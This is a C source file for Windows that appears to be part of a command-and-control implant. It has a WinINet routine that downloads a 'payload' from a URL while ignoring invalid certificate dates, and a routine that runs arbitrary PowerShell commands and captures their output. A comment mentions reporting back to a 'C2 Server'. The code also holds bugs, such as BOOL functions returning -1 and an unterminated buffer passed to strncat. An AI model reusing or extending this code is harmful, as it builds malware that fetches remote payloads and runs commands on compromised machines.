#include <windows.h>
#include <stdio.h>

#define BUFFER_SIZE 4096

// Function to handle internet connection
BOOL InvokeUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

	BOOL		bSTATE            = TRUE;

	HINTERNET	hInternet         = NULL,
			    hInternetFile     = NULL;

	DWORD		dwBytesRead       = NULL;
	
	SIZE_T		sSize             = NULL;
	PBYTE		pBytes            = NULL,
			    pTmpBytes          = NULL;



	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL){
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}


	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL){
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}


	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL){
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE){

		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			bSTATE = FALSE; goto _EndOfFunction;
		}

		sSize += dwBytesRead;

		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}
		
		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
		memset(pTmpBytes, '\0', dwBytesRead);

		if (dwBytesRead < 1024){
			break;
		}
	}
	


	*pPayloadBytes = pBytes;
	*sPayloadSize  = sSize;

_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	if (pTmpBytes)
		LocalFree(pTmpBytes);
	return bSTATE;
}


// Function to execute PowerShell command and capture the output
BOOL ExecutePowerShellCommand(const char *command, char *outputBuffer, DWORD bufferSize)
{
    HANDLE hStdOutRead, hStdOutWrite;
    SECURITY_ATTRIBUTES saAttr;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    DWORD bytesRead;
    CHAR chBuf[BUFFER_SIZE];
    BOOL bSuccess = FALSE;

    // Set up security attributes for pipe
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    // Create a pipe to capture the output
    if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &saAttr, 0))
    {
        printf("CreatePipe failed. Error: %lu\n", GetLastError());
        return -1;
    }

    // Ensure the read handle to the pipe is not inherited
    if (!SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0))
    {
        printf("SetHandleInformation failed. Error: %lu\n", GetLastError());
        return -1;
    }

    // Set up the STARTUPINFO struct
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.hStdOutput = hStdOutWrite;
    si.hStdError = hStdOutWrite;
    si.dwFlags |= STARTF_USESTDHANDLES;

    // Create the PowerShell process
    char cmdLine[1024];
    snprintf(cmdLine, sizeof(cmdLine), "powershell.exe -Command \"%s\"", command);

    if (!CreateProcess(
        NULL,            // No module name (use command line)
        cmdLine,         // Command line
        NULL,            // Process security attributes
        NULL,            // Primary thread security attributes
        TRUE,            // Inherit handles
        0,               // No creation flags
        NULL,            // Use parent's environment
        NULL,            // Use parent's current directory
        &si,             // STARTUPINFO
        &pi))            // PROCESS_INFORMATION
    {
        printf("CreateProcess failed. Error: %lu\n", GetLastError());
        return -1;
    }

    // Close the write end of the pipe as we don't need it
    CloseHandle(hStdOutWrite);

    // Read the output from the pipe
    while (TRUE)
    {
        bSuccess = ReadFile(hStdOutRead, chBuf, sizeof(chBuf) - 1, &bytesRead, NULL);
        if (!bSuccess || bytesRead == 0)
            break;

        // Append the data to the output buffer
        strncat(outputBuffer, chBuf, bufferSize - strlen(outputBuffer) - 1);
    }

    // Clean up
    CloseHandle(hStdOutRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}

int main()
{
    char ResBuf[BUFFER_SIZE] = {0};
    const char *command = "Get-Process";  // Example PowerShell command

    // Execute the PowerShell command and capture the output
    int result = ExecutePowerShellCommand(command, ResBuf, sizeof(ResBuf));

    if (result == 0)
    {
        printf("Command output:\n%s\n", ResBuf);
    }
    else
    {
        // Set ResBuf to an error message for the C2 Server
    }

    return 0;
}
